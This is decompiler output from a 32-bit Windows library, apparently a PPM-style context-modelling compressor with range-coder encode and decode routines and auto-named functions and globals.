unsigned __int8 *__userpurge sub_100368FB@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 *i@<ecx>, int a3)
{
  unsigned __int8 *v3; // esi
  unsigned __int8 *v4; // edi
  int *v5; // ebx
  bool v6; // zf
  unsigned __int8 v7; // al
  unsigned __int8 *result; // eax
  unsigned __int8 v9; // cl
  _BYTE *v10; // eax
  char v11; // dl
  unsigned int v12; // eax
  unsigned int v13; // ecx
  unsigned __int8 v14; // al
  int v15; // ecx
  int v16; // [esp+Ch] [ebp-50h] BYREF
  char v17; // [esp+10h] [ebp-4Ch] BYREF
  int v18; // [esp+4Ch] [ebp-10h]
  _BYTE *v19; // [esp+50h] [ebp-Ch]
  unsigned __int8 v20; // [esp+5Bh] [ebp-1h]

  v3 = a1;
  v4 = *(unsigned __int8 **)(dword_100BE194 + 2);
  v5 = &v16;
  v20 = *(_BYTE *)dword_100BE194;
  if ( !a3 )
  {
    v6 = *((_DWORD *)a1 + 2) == 0;
    v16 = dword_100BE194;
    v5 = (int *)&v17;
    if ( v6 )
      goto LABEL_16;
  }
  if ( !i )
    goto LABEL_5;
  v3 = (unsigned __int8 *)*((_DWORD *)a1 + 2);
  while ( *(unsigned __int8 **)(i + 2) == v4 )
  {
    *v5++ = (int)i;
    if ( !*((_DWORD *)v3 + 2) )
      goto LABEL_14;
LABEL_5:
    v3 = (unsigned __int8 *)*((_DWORD *)v3 + 2);
    if ( *v3 )
    {
      for ( i = (unsigned __int8 *)*((_DWORD *)v3 + 1); *i != v20; i += 6 )
        ;
      v7 = i[1];
      i[1] = (v7 < 0x73u) + v7;
      *((_WORD *)v3 + 1) += v7 < 0x73u;
    }
    else
    {
      i = v3 + 2;
      v3[3] += v3[3] < 0x18u && **((_BYTE **)v3 + 2) == 0;
    }
  }
  v3 = *(unsigned __int8 **)(i + 2);
LABEL_14:
  if ( v5 == &v16 )
    return v3;
LABEL_16:
  v9 = *v4;
  v6 = *v3 == 0;
  LOBYTE(v18) = 0;
  BYTE2(v18) = v9;
  v19 = v4 + 1;
  BYTE1(v18) = (8 * (v9 >= 0x40u)) | (16 * (v20 >= 0x40u));
  if ( v6 )
  {
    v14 = v3[3];
  }
  else
  {
    v10 = (_BYTE *)*((_DWORD *)v3 + 1);
    if ( *v10 != v9 )
    {
      do
      {
        v11 = v10[6];
        v10 += 6;
      }
      while ( v11 != v9 );
    }
    v12 = (unsigned __int8)v10[1] - 1;
    v13 = *((unsigned __int16 *)v3 + 1) - *v3 - v12;
    if ( 2 * v12 > v13 )
      v12 = (v12 + 2 * v13 - 3) / v13;
    else
      LOBYTE(v12) = v13 < 5 * v12;
    v14 = v12 + 1;
  }
  HIBYTE(v18) = v14;
  while ( 1 )
  {
    result = (unsigned __int8 *)sub_10035C2D();
    if ( !result )
      break;
    *(_DWORD *)result = v18;
    *((_DWORD *)result + 1) = v19;
    v15 = *--v5;
    *((_DWORD *)result + 2) = v3;
    *(_DWORD *)(v15 + 2) = result;
    v3 = result;
    if ( v5 == &v16 )
      return result;
  }
  return 0;
}
// 100BE194: using guessed type int dword_100BE194;

//----- (10036A47) --------------------------------------------------------
char *__cdecl sub_10036A47(unsigned __int8 *a1)
{
  unsigned __int8 *v1; // ebx
  int v2; // esi
  char v3; // dl
  int v4; // eax
  int v5; // edi
  int v6; // ecx
  unsigned __int8 v7; // dl
  __int16 v8; // cx
  char *result; // eax
  int v10; // ecx
  unsigned __int8 *v11; // eax
  unsigned int v12; // esi
  int v13; // eax
  _DWORD *v14; // eax
  int v15; // eax
  unsigned __int8 v16; // cl
  unsigned __int16 v17; // dx
  unsigned int v18; // ecx
  unsigned int v19; // eax
  __int16 v20; // dx
  int v21; // eax
  int v22; // [esp+Ch] [ebp-1Ch]
  __int16 v23; // [esp+10h] [ebp-18h]
  unsigned int v24; // [esp+10h] [ebp-18h]
  unsigned int v25; // [esp+14h] [ebp-14h]
  int v26; // [esp+18h] [ebp-10h]
  unsigned int v27; // [esp+18h] [ebp-10h]
  unsigned int v28; // [esp+1Ch] [ebp-Ch]
  unsigned int v29; // [esp+20h] [ebp-8h]
  unsigned __int8 v30; // [esp+27h] [ebp-1h]

  v1 = (unsigned __int8 *)dword_100BD408;
  v2 = dword_100BE194;
  v3 = *(_BYTE *)dword_100BE194;
  v29 = *(_DWORD *)(dword_100BE194 + 2);
  v4 = *((_DWORD *)a1 + 2);
  v5 = 0;
  v25 = *(unsigned __int8 *)(dword_100BE194 + 1);
  v30 = *(_BYTE *)dword_100BE194;
  if ( v25 < 0x1F && v4 )
  {
    if ( *(_BYTE *)v4 )
    {
      v5 = *(_DWORD *)(v4 + 4);
      if ( *(_BYTE *)v5 != v3 )
      {
        do
          v5 += 6;
        while ( *(_BYTE *)v5 != v3 );
        if ( *(_BYTE *)(v5 + 1) >= *(_BYTE *)(v5 - 5) )
        {
          v23 = *(_WORD *)v5;
          v6 = v5 - 6;
          v26 = *(_DWORD *)(v5 + 2);
          *(_WORD *)v5 = *(_WORD *)(v5 - 6);
          *(_DWORD *)(v5 + 2) = *(_DWORD *)(v5 - 6 + 2);
          *(_WORD *)v6 = v23;
          *(_DWORD *)(v6 + 2) = v26;
          v5 -= 6;
        }
      }
      v7 = *(_BYTE *)(v5 + 1);
      v8 = 2 * (v7 < 0x73u);
      *(_BYTE *)(v5 + 1) = v8 + v7;
      *(_WORD *)(v4 + 2) += v8;
    }
    else
    {
      v5 = v4 + 2;
      *(_BYTE *)(v4 + 3) += *(_BYTE *)(v4 + 3) < 0x20u;
    }
  }
  if ( dword_100BD3D8 || !v29 )
  {
    v10 = dword_100BD3F4;
    *(_BYTE *)dword_100BD3F4 = v30;
    dword_100BD3F4 = v10 + 1;
    v28 = v10 + 1;
    if ( v10 + 1 >= (unsigned int)dword_100BEFA8 )
      return sub_10036481(v1, a1, v29);
    if ( v29 )
    {
      if ( v29 >= dword_100BEFA8 )
      {
LABEL_20:
        if ( !v29 )
          return sub_10036481(v1, a1, v29);
        if ( --dword_100BD3D8 )
        {
          if ( dword_100BEFD8 > 2 )
          {
            dword_100BD3D8 = 0;
            v28 = v29;
            dword_100BD3F4 = (int)Block;
          }
        }
        else
        {
          v28 = v29;
          dword_100BD3F4 -= dword_100BD408 != (_DWORD)a1;
        }
        v12 = *((unsigned __int16 *)a1 + 1) - *a1 - v25;
        v27 = *a1;
        v24 = v12;
        if ( (unsigned __int8 *)dword_100BD408 != a1 )
        {
          do
          {
            v13 = *v1;
            v22 = v13;
            if ( *v1 )
            {
              if ( (v13 & 1) != 0 )
              {
                v14 = sub_10035C91((unsigned int)(v13 + 1) >> 1, *((_DWORD **)v1 + 1));
                if ( !v14 )
                  return sub_10036481(v1, a1, v29);
                v12 = v24;
                *((_DWORD *)v1 + 1) = v14;
                v13 = v22;
              }
              *((_WORD *)v1 + 1) += 3 * v13 + 1 < v27;
            }
            else
            {
              v15 = sub_10035BD5(1);
              if ( !v15 )
                return sub_10036481(v1, a1, v29);
              *(_WORD *)v15 = *((_WORD *)v1 + 1);
              *(_DWORD *)(v15 + 2) = *((_DWORD *)v1 + 1);
              *((_DWORD *)v1 + 1) = v15;
              v16 = *(_BYTE *)(v15 + 1);
              if ( v16 >= 0x1Eu )
                *(_BYTE *)(v15 + 1) = 120;
              else
                *(_BYTE *)(v15 + 1) = 2 * v16;
              *((_WORD *)v1 + 1) = dword_100BD3E0 + *(unsigned __int8 *)(v15 + 1) + (v27 > 2);
            }
            v17 = *((_WORD *)v1 + 1);
            v18 = v12 + v17;
            v19 = 2 * v25 * (v17 + 6);
            if ( v19 >= 6 * v18 )
            {
              LOWORD(v18) = (12 * v18 < v19) + (15 * v18 < v19) + (9 * v18 < v19) + 4;
              v12 = v24;
              v20 = v18 + v17;
            }
            else
            {
              LOBYTE(v18) = (v19 >= 4 * v18) + (v18 < v19) + 1;
              v20 = v17 + 4;
            }
            v21 = *((_DWORD *)v1 + 1) + 6 * ++*v1;
            *((_WORD *)v1 + 1) = v20;
            *(_DWORD *)(v21 + 2) = v28;
            *(_BYTE *)v21 = v30;
            *(_BYTE *)(v21 + 1) = v18;
            v1[1] |= 8 * (v30 >= 0x40u);
            v1 = (unsigned __int8 *)*((_DWORD *)v1 + 2);
          }
          while ( v1 != a1 );
        }
        result = (char *)v29;
        goto LABEL_41;
      }
      v11 = sub_100368FB(a1, (unsigned __int8 *)v5, 0);
    }
    else
    {
      v11 = (unsigned __int8 *)sub_10036600((int)a1, v5);
    }
    v29 = (unsigned int)v11;
    goto LABEL_20;
  }
  result = (char *)sub_100368FB(a1, (unsigned __int8 *)v5, 1);
  *(_DWORD *)(v2 + 2) = result;
  if ( !result )
    return sub_10036481(v1, a1, v29);
LABEL_41:
  dword_100BD408 = (int)result;
  return result;
}
// 100BD3D8: using guessed type int dword_100BD3D8;
// 100BD3E0: using guessed type int dword_100BD3E0;
// 100BD3F4: using guessed type int dword_100BD3F4;
// 100BD408: using guessed type int dword_100BD408;
// 100BE194: using guessed type int dword_100BE194;
// 100BEFA8: using guessed type int dword_100BEFA8;
// 100BEFD8: using guessed type int dword_100BEFD8;

//----- (10036D07) --------------------------------------------------------
int __thiscall sub_10036D07(int this, int a2)
{
  unsigned __int8 *v2; // eax
  unsigned __int8 v3; // dl
  unsigned __int16 *v4; // esi
  int v5; // eax
  int result; // eax
  unsigned __int16 v7; // dx
  unsigned __int16 v8; // cx
  int v9; // eax

  v2 = (unsigned __int8 *)(this + 2);
  v3 = *(_BYTE *)(this + 3);
  v4 = (unsigned __int16 *)((char *)&unk_100BD510
                          + 128 * *((unsigned __int8 *)&dword_100BE194 + v3 + 3)
                          + 2 * ((dword_100BE29C >> 26) & 0x20)
                          + 2
                          * (unsigned __int8)(byte_100BD3F9
                                            + *(_BYTE *)(this + 1)
                                            + byte_100BE2A0[**(unsigned __int8 **)(this + 8)]));
  if ( *(unsigned __int8 *)(this + 2) == a2 )
  {
    dword_100BD3E4 = 0;
    *(_BYTE *)(this + 3) = v3 + (v3 < 0xC4u);
    dword_100BE194 = this + 2;
    v5 = *v4;
    dword_100BD3E8 = (unsigned __int16)v5;
    result = v5 - (((unsigned __int16)v5 + 32) >> 7) + 128;
    ++dword_100BE29C;
    *v4 = result;
    byte_100BD3F9 = 1;
  }
  else
  {
    v7 = *v4;
    dword_100BD3E4 = *v4;
    v8 = v7 - ((v7 + 32) >> 7);
    *v4 = v8;
    v9 = *v2;
    dword_100BD3E0 = (unsigned __int8)byte_10092CA0[v8 >> 10];
    byte_100BD410[v9] = byte_100BD3F8;
    result = 0;
    dword_100BD3E8 = 0x4000;
    byte_100BD3F9 = 0;
    byte_100BD3FA = 0;
    dword_100BE194 = 0;
  }
  return result;
}
// 100BD3E0: using guessed type int dword_100BD3E0;
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3F9: using guessed type char byte_100BD3F9;
// 100BD3FA: using guessed type char byte_100BD3FA;
// 100BE194: using guessed type int dword_100BE194;
// 100BE29C: using guessed type int dword_100BE29C;

//----- (10036DF6) --------------------------------------------------------
int __usercall sub_10036DF6@<eax>(int a1@<eax>)
{
  unsigned __int8 *v1; // esi
  unsigned __int16 *v2; // edi
  unsigned int v3; // ebx
  unsigned __int8 v4; // al
  int v5; // eax
  int result; // eax
  __int16 v7; // ax
  char v8; // cl
  unsigned __int16 v9; // ax

  v1 = (unsigned __int8 *)(a1 + 2);
  v2 = (unsigned __int16 *)((char *)&unk_100BD510
                          + 128 * *((unsigned __int8 *)&dword_100BE194 + *(unsigned __int8 *)(a1 + 3) + 3)
                          + 2 * ((dword_100BE29C >> 26) & 0x20)
                          + 2
                          * (unsigned __int8)(byte_100BD3F9
                                            + *(_BYTE *)(a1 + 1)
                                            + byte_100BE2A0[**(unsigned __int8 **)(a1 + 8)]));
  v3 = *v2;
  if ( sub_10035800() >= v3 )
  {
    v7 = *v2;
    v8 = byte_100BD3F8;
    dword_100BD3E4 = v3;
    v9 = v7 - ((int)(v3 + 32) >> 7);
    *v2 = v9;
    dword_100BD3E0 = (unsigned __int8)byte_10092CA0[v9 >> 10];
    byte_100BD410[*v1] = v8;
    result = 0;
    dword_100BD3E8 = 0x4000;
    byte_100BD3F9 = 0;
    byte_100BD3FA = 0;
    dword_100BE194 = 0;
  }
  else
  {
    v4 = v1[1];
    dword_100BD3E4 = 0;
    v1[1] = v4 + (v4 < 0xC4u);
    v5 = *v2;
    dword_100BD3E8 = (unsigned __int16)v5;
    result = v5 - (((unsigned __int16)v5 + 32) >> 7) + 128;
    ++dword_100BE29C;
    dword_100BE194 = (int)v1;
    *v2 = result;
    byte_100BD3F9 = 1;
  }
  return result;
}
// 100BD3E0: using guessed type int dword_100BD3E0;
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3F9: using guessed type char byte_100BD3F9;
// 100BD3FA: using guessed type char byte_100BD3FA;
// 100BE194: using guessed type int dword_100BE194;
// 100BE29C: using guessed type int dword_100BE29C;

//----- (10036EE0) --------------------------------------------------------
char __usercall sub_10036EE0@<al>(int a1@<eax>, int a2@<ecx>)
{
  bool v3; // cc
  __int16 v4; // dx
  int v5; // ecx
  int v6; // esi

  *(_BYTE *)(a1 + 1) += 4;
  *(_WORD *)(a2 + 2) += 4;
  v3 = *(_BYTE *)(a1 + 1) <= *(_BYTE *)(a1 - 5);
  dword_100BE194 = a1;
  if ( !v3 )
  {
    v4 = *(_WORD *)a1;
    v5 = a1 - 6;
    *(_WORD *)a1 = *(_WORD *)(a1 - 6);
    v6 = *(_DWORD *)(a1 + 2);
    *(_DWORD *)(a1 + 2) = *(_DWORD *)(a1 - 6 + 2);
    *(_DWORD *)(v5 + 2) = v6;
    *(_WORD *)v5 = v4;
    v3 = *(_BYTE *)(a1 - 6 + 1) <= 0x7Cu;
    dword_100BE194 = a1 - 6;
    if ( !v3 )
      LOBYTE(a1) = sub_10036736((unsigned __int8 *)a2);
  }
  return a1;
}
// 100BE194: using guessed type int dword_100BE194;

//----- (10036F2B) --------------------------------------------------------
char __userpurge sub_10036F2B@<al>(unsigned __int8 *a1@<eax>, int a2)
{
  unsigned __int8 *v3; // eax
  int v4; // ecx
  unsigned int v5; // esi
  unsigned __int8 v6; // cl
  bool v7; // cc
  int v8; // ecx
  int v9; // edx
  int v10; // edx
  char v11; // dl
  int v12; // ecx

  v3 = (unsigned __int8 *)*((_DWORD *)a1 + 1);
  v4 = *v3;
  v5 = *((unsigned __int16 *)a1 + 1);
  dword_100BD3EC = v5;
  if ( v4 == a2 )
  {
    v6 = v3[1];
    dword_100BD3E8 = v6;
    v3[1] = v6 + 4;
    *((_WORD *)a1 + 1) += 4;
    dword_100BE29C += 2 * (unsigned int)v6 >= v5;
    v7 = v3[1] <= 0x7Cu;
    byte_100BD3F9 = 2 * (unsigned int)v6 >= v5;
    dword_100BE194 = (int)v3;
    if ( !v7 )
      LOBYTE(v3) = sub_10036736(a1);
    dword_100BD3E4 = 0;
  }
  else
  {
    v8 = v3[1];
    v9 = *a1;
    byte_100BD3F9 = 0;
    do
    {
      v3 += 6;
      if ( *v3 == a2 )
      {
        v10 = v8 + v3[1];
        dword_100BD3E4 = v8;
        dword_100BD3E8 = v10;
        LOBYTE(v3) = sub_10036EE0((int)v3, (int)a1);
        return (char)v3;
      }
      v8 += v3[1];
      --v9;
    }
    while ( v9 );
    if ( *((_DWORD *)a1 + 2) )
      v5 = dword_100BD3EC;
    v11 = byte_100BD3F8;
    dword_100BE194 = 0;
    dword_100BD3E4 = v8;
    byte_100BD410[*v3] = byte_100BD3F8;
    byte_100BD3FA = *a1;
    v12 = (unsigned __int8)byte_100BD3FA;
    do
    {
      v3 -= 6;
      --v12;
      byte_100BD410[*v3] = v11;
    }
    while ( v12 );
    dword_100BD3E8 = v5;
  }
  return (char)v3;
}
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;
// 100BD3EC: using guessed type int dword_100BD3EC;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3F9: using guessed type char byte_100BD3F9;
// 100BD3FA: using guessed type char byte_100BD3FA;
// 100BE194: using guessed type int dword_100BE194;
// 100BE29C: using guessed type int dword_100BE29C;

//----- (10037020) --------------------------------------------------------
char __usercall sub_10037020@<al>(unsigned __int8 *a1@<eax>)
{
  unsigned __int8 *v2; // esi
  unsigned int v3; // ebx
  unsigned int v4; // eax
  unsigned int v5; // ebx
  char result; // al
  int v7; // ecx
  int v8; // edx
  int v9; // eax
  int v10; // eax
  char v11; // cl
  int v12; // eax

  v2 = (unsigned __int8 *)*((_DWORD *)a1 + 1);
  v3 = v2[1];
  dword_100BD3EC = *((unsigned __int16 *)a1 + 1);
  v4 = sub_100357DB();
  if ( v4 >= v3 )
  {
    v7 = *a1;
    byte_100BD3F9 = 0;
    do
    {
      v8 = v2[7];
      v2 += 6;
      v3 += v8;
      if ( v3 > v4 )
      {
        v9 = v2[1];
        dword_100BD3E8 = v3;
        dword_100BD3E4 = v3 - v9;
        return sub_10036EE0((int)v2, (int)a1);
      }
      --v7;
    }
    while ( v7 );
    v10 = *v2;
    v11 = byte_100BD3F8;
    dword_100BE194 = 0;
    byte_100BD410[v10] = byte_100BD3F8;
    byte_100BD3FA = *a1;
    dword_100BD3E4 = v3;
    v12 = (unsigned __int8)byte_100BD3FA;
    do
    {
      v2 -= 6;
      --v12;
      byte_100BD410[*v2] = v11;
    }
    while ( v12 );
    result = dword_100BD3EC;
    dword_100BD3E8 = dword_100BD3EC;
  }
  else
  {
    dword_100BD3E8 = v3;
    byte_100BD3F9 = 2 * v3 >= dword_100BD3EC;
    v5 = v3 + 4;
    result = byte_100BD3F9;
    dword_100BE29C += (unsigned __int8)byte_100BD3F9;
    v2[1] = v5;
    *((_WORD *)a1 + 1) += 4;
    dword_100BE194 = (int)v2;
    if ( v5 > 0x7C )
      result = sub_10036736(a1);
    dword_100BD3E4 = 0;
  }
  return result;
}
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;
// 100BD3EC: using guessed type int dword_100BD3EC;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3F9: using guessed type char byte_100BD3F9;
// 100BD3FA: using guessed type char byte_100BD3FA;
// 100BE194: using guessed type int dword_100BE194;
// 100BE29C: using guessed type int dword_100BE29C;

//----- (1003710C) --------------------------------------------------------
int __usercall sub_1003710C@<eax>(int a1@<eax>, int a2@<ecx>)
{
  bool v2; // cc
  int result; // eax

  *(_BYTE *)(a1 + 1) += 4;
  *(_WORD *)(a2 + 2) += 4;
  v2 = *(_BYTE *)(a1 + 1) <= 0x7Cu;
  dword_100BE194 = a1;
  if ( !v2 )
    sub_10036736((unsigned __int8 *)a2);
  result = dword_100BD40C;
  ++byte_100BD3F8;
  dword_100BE29C = dword_100BD40C;
  return result;
}
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD40C: using guessed type int dword_100BD40C;
// 100BE194: using guessed type int dword_100BE194;
// 100BE29C: using guessed type int dword_100BE29C;

//----- (1003713A) --------------------------------------------------------
int *__thiscall sub_1003713A(unsigned __int8 *this)
{
  int *result; // eax
  int v2; // esi

  if ( *this == 0xFF )
  {
    result = &dword_100BE3A4;
    dword_100BD3EC = 1;
  }
  else
  {
    result = (int *)((char *)&unk_100BE3A8
                   + 128 * (unsigned __int8)byte_100BE19A[*this]
                   + 8 * (2 * *this < (unsigned __int8)byte_100BD3FA + **((unsigned __int8 **)this + 2))
                   + 4 * this[1]
                   + 4 * (*((unsigned __int16 *)this + 1) > 11 * (*this + 1))
                   - 384);
    v2 = *(unsigned __int16 *)result >> *((_BYTE *)result + 2);
    *(_WORD *)result -= v2;
    dword_100BD3EC = v2 + (v2 == 0);
  }
  return result;
}
// 100BD3EC: using guessed type int dword_100BD3EC;
// 100BD3FA: using guessed type char byte_100BD3FA;
// 100BE3A4: using guessed type int dword_100BE3A4;

//----- (100371E0) --------------------------------------------------------
char __userpurge sub_100371E0@<al>(unsigned __int8 *a1@<ebx>, int a2)
{
  int *v2; // eax
  char v3; // cl
  int v4; // edi
  int v5; // edx
  unsigned __int8 *v6; // esi
  int v7; // eax
  bool v8; // zf
  int v9; // eax
  int v10; // ecx
  char result; // al
  int v12; // edi
  int *v13; // [esp+Ch] [ebp-4h]
  unsigned __int8 *i; // [esp+18h] [ebp+8h]

  v2 = sub_1003713A(a1);
  v3 = byte_100BD3F8;
  v13 = v2;
  v4 = 0;
  v5 = *a1 - (unsigned __int8)byte_100BD3FA;
  v6 = (unsigned __int8 *)(*((_DWORD *)a1 + 1) - 6);
  while ( 1 )
  {
    do
    {
      v6 += 6;
      v7 = *v6;
    }
    while ( byte_100BD410[v7] == v3 );
    v8 = v7 == a2;
    byte_100BD410[v7] = v3;
    v9 = v6[1];
    if ( v8 )
      break;
    v4 += v9;
    if ( !--v5 )
    {
      v10 = v4 + dword_100BD3EC;
      *(_WORD *)v13 += v4 + dword_100BD3EC;
      result = *a1;
      dword_100BD3E4 = v4;
      dword_100BD3EC = v10;
      dword_100BD3E8 = v10;
      byte_100BD3FA = result;
      return result;
    }
  }
  dword_100BD3E4 = v4;
  v12 = v9 + v4;
  dword_100BD3E8 = v12;
  for ( i = v6; --v5; v12 += i[1] )
  {
    do
      i += 6;
    while ( byte_100BD410[*i] == v3 );
  }
  dword_100BD3EC += v12;
  sub_10035EFB((int)v13);
  return sub_1003710C((int)v6, (int)a1);
}
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;
// 100BD3EC: using guessed type int dword_100BD3EC;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3FA: using guessed type char byte_100BD3FA;

//----- (100372B2) --------------------------------------------------------
int *__usercall sub_100372B2@<eax>(unsigned __int8 *a1@<eax>)
{
  int *v2; // eax
  int v3; // ecx
  int v4; // ecx
  int *v5; // esi
  unsigned __int8 *v6; // eax
  int v7; // esi
  unsigned int v8; // eax
  int v9; // edi
  int *v10; // edx
  unsigned int i; // ecx
  int v12; // eax
  int *result; // eax
  unsigned __int8 v14; // bl
  int v15; // eax
  int v16; // ecx
  int v17[256]; // [esp+Ch] [ebp-40Ch] BYREF
  int *v18; // [esp+40Ch] [ebp-Ch]
  unsigned int v19; // [esp+410h] [ebp-8h]
  unsigned int v20; // [esp+414h] [ebp-4h]

  v2 = sub_1003713A(a1);
  v3 = *a1;
  v19 = 0;
  v18 = v2;
  v4 = v3 - (unsigned __int8)byte_100BD3FA;
  v5 = v17;
  v6 = (unsigned __int8 *)(*((_DWORD *)a1 + 1) - 6);
  do
  {
    do
    {
      v6 += 6;
      v20 = *v6;
    }
    while ( byte_100BD410[v20] == byte_100BD3F8 );
    v19 += v6[1];
    *v5++ = (int)v6;
    --v4;
  }
  while ( v4 );
  v7 = v19 + dword_100BD3EC;
  dword_100BD3EC += v19;
  v8 = sub_100357DB();
  v9 = v17[0];
  v20 = v8;
  v10 = v17;
  if ( v8 >= v19 )
  {
    v14 = *a1;
    dword_100BD3E4 = v19;
    dword_100BD3E8 = v7;
    v15 = v14 - (unsigned __int8)byte_100BD3FA;
    byte_100BD3FA = v14;
    do
    {
      v16 = *(unsigned __int8 *)*v10++;
      --v15;
      byte_100BD410[v16] = byte_100BD3F8;
    }
    while ( v15 );
    result = v18;
    *(_WORD *)v18 += v7;
  }
  else
  {
    for ( i = *(unsigned __int8 *)(v17[0] + 1); i <= v20; i += *(unsigned __int8 *)(*v10 + 1) )
      v9 = *++v10;
    v12 = *(unsigned __int8 *)(v9 + 1);
    dword_100BD3E8 = i;
    dword_100BD3E4 = i - v12;
    sub_10035EFB((int)v18);
    return (int *)sub_1003710C(v9, (int)a1);
  }
  return result;
}
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;
// 100BD3EC: using guessed type int dword_100BD3EC;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3FA: using guessed type char byte_100BD3FA;

//----- (100373B6) --------------------------------------------------------
void *sub_100373B6()
{
  byte_100BD3F8 = 1;
  return memset(byte_100BD410, 0, sizeof(byte_100BD410));
}
// 100BD3F8: using guessed type char byte_100BD3F8;

//----- (100373D2) --------------------------------------------------------
unsigned int __stdcall sub_100373D2(_DWORD *a1, _DWORD *a2)
{
  char v2; // bl
  int v3; // esi
  int v4; // edi
  unsigned int result; // eax
  unsigned int v6; // eax
  int v7; // esi

  unk_100BEFAC = 0;
  dword_100BD3DC = -1;
  sub_10036031(14, 0);
LABEL_2:
  v2 = *(_BYTE *)dword_100BD408;
  v3 = dword_100BD408;
  v4 = sub_1003573C(a2);
  if ( v2 )
  {
    sub_10036F2B((unsigned __int8 *)v3, v4);
LABEL_12:
    sub_10035780();
  }
  else
  {
    sub_10036D07(v3, v4);
    sub_100357B0();
  }
  if ( dword_100BE194 )
  {
    if ( dword_100BD3D8 || *(_DWORD *)(dword_100BE194 + 2) < (unsigned int)dword_100BEFA8 )
    {
      sub_10036A47((unsigned __int8 *)v3);
      if ( !byte_100BD3F8 )
        sub_100373B6();
    }
    else
    {
      dword_100BD408 = *(_DWORD *)(dword_100BE194 + 2);
    }
    v6 = unk_100BEFAC;
    while ( 1 )
    {
      if ( (v6 ^ (dword_100BD3DC + v6)) >= 0x1000000 )
      {
        if ( (unsigned int)dword_100BD3DC >= 0x8000 )
          goto LABEL_2;
        dword_100BD3DC = -v6 & 0x7FFF;
      }
      sub_1003575C(a1, HIBYTE(v6));
      dword_100BD3DC <<= 8;
      v6 = unk_100BEFAC << 8;
      unk_100BEFAC <<= 8;
    }
  }
  while ( 1 )
  {
    result = unk_100BEFAC;
    if ( (unk_100BEFAC ^ (unsigned int)(dword_100BD3DC + unk_100BEFAC)) < 0x1000000 )
      goto LABEL_8;
    if ( (unsigned int)dword_100BD3DC >= 0x8000 )
      break;
    dword_100BD3DC = -unk_100BEFAC & 0x7FFF;
LABEL_8:
    sub_1003575C(a1, HIBYTE(unk_100BEFAC));
    dword_100BD3DC <<= 8;
    unk_100BEFAC <<= 8;
  }
  while ( 1 )
  {
    v3 = *(_DWORD *)(v3 + 8);
    ++dword_100BD3D8;
    if ( !v3 )
      break;
    if ( *(_BYTE *)v3 != byte_100BD3FA )
    {
      sub_100371E0((unsigned __int8 *)v3, v4);
      goto LABEL_12;
    }
  }
  v7 = 4;
  do
  {
    sub_1003575C(a1, HIBYTE(result));
    result = unk_100BEFAC << 8;
    --v7;
    unk_100BEFAC <<= 8;
  }
  while ( v7 );
  return result;
}
// 100BD3D8: using guessed type int dword_100BD3D8;
// 100BD3DC: using guessed type int dword_100BD3DC;
// 100BD3F8: using guessed type char byte_100BD3F8;
// 100BD3FA: using guessed type char byte_100BD3FA;
// 100BD408: using guessed type int dword_100BD408;
// 100BE194: using guessed type int dword_100BE194;
// 100BEFA8: using guessed type int dword_100BEFA8;

//----- (10037551) --------------------------------------------------------
char __stdcall sub_10037551(_DWORD *a1, _DWORD *a2)
{
  int v2; // esi
  char v3; // bl
  int v4; // esi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax

  dword_100BD3DC = -1;
  dword_100BD3F0 = 0;
  unk_100BEFAC = 0;
  v2 = 4;
  do
  {
    --v2;
    dword_100BD3F0 = (dword_100BD3F0 << 8) | sub_1003573C(a2);
  }
  while ( v2 );
  sub_10036031(14, 0);
  v3 = *(_BYTE *)dword_100BD408;
  v4 = dword_100BD408;
LABEL_4:
  if ( v3 )
    sub_10037020((unsigned __int8 *)v4);
  else
    sub_10036DF6(v4);
LABEL_15:
  sub_1003581B();
  if ( dword_100BE194 )
  {
    sub_1003575C(a1, *(unsigned __int8 *)dword_100BE194);
    if ( dword_100BD3D8 || *(_DWORD *)(dword_100BE194 + 2) < (unsigned int)dword_100BEFA8 )
    {
      sub_10036A47((unsigned __int8 *)v4);
      if ( !byte_100BD3F8 )
        sub_100373B6();
    }
    else
    {
      dword_100BD408 = *(_DWORD *)(dword_100BE194 + 2);
    }
    v3 = *(_BYTE *)dword_100BD408;
    v4 = dword_100BD408;
    v7 = unk_100BEFAC;
    while ( 1 )
    {
      if ( (v7 ^ (unsigned int)(dword_100BD3DC + v7)) >= 0x1000000 )
      {
        if ( (unsigned int)dword_100BD3DC >= 0x8000 )
          goto LABEL_4;
        dword_100BD3DC = -v7 & 0x7FFF;
      }
      v8 = sub_1003573C(a2);
      dword_100BD3DC <<= 8;
      dword_100BD3F0 = (dword_100BD3F0 << 8) | v8;
      v7 = unk_100BEFAC << 8;
      unk_100BEFAC <<= 8;
    }
  }
  v5 = unk_100BEFAC;
  while ( 1 )
  {
    if ( (v5 ^ (unsigned int)(dword_100BD3DC + v5)) < 0x1000000 )
      goto LABEL_11;
    if ( (unsigned int)dword_100BD3DC >= 0x8000 )
      break;
    dword_100BD3DC = -v5 & 0x7FFF;
LABEL_11:
    v6 = sub_1003573C(a2);
    dword_100BD3DC <<= 8;
    dword_100BD3F0 = (dword_100BD3F0 << 8) | v6;
    v5 = unk_100BEFAC << 8;
    unk_100BEFAC <<= 8;
  }
  while ( 1 )
  {
    v4 = *(_DWORD *)(v4 + 8);
    ++dword_100BD3D8;
    if ( !v4 )
      return v5;
    LOBYTE(v5) = *(_BYTE *)v4;
    if ( *(_BYTE *)v4 != byte_100BD3FA )
    {
      sub_100372B2((unsigned __int8 *)v4);
      goto LABEL_15;
    }
  }
}
// 100BD3D8: using guessed type int dword_100BD3D8;
// 100BD3DC: using guessed type int dword_100BD3DC;
// 100BD3F0: using guessed type int dword_100BD3F0;
